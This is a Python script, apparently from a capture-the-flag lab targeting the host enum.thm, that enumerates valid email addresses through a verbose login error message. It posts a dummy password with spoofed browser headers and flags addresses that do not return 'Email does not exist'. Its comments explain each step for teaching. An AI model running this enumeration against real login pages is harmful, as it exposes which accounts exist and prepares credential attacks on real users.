import requests
import sys

# username repository: https://github.com/nyxgeek/username-lists/tree/master/usernames-top100

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  #The script targets the endpoint handling the login functionality of the application.
    
    # A collection of HTTP headers is defined to mimic a typical browser request, ensuring the requests appear legitimate.
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = [] # An array stores email addresses confirmed to be valid.
    invalid_error = "Email does not exist"  # A string contains the specific error message used to identify invalid emails.

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email) #The script reads email addresses from a provided file and checks each for validity using the check_email function.
            if response_json['status'] == 'error' and invalid_error in response_json['message']: #The response from the server is processed to check if the provided email exists, based on the presence of the specific error message in the JSON data.
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email) #Emails confirmed to exist are added to the valid_emails list, with each email's validity logged to the console.

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 <script name> <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
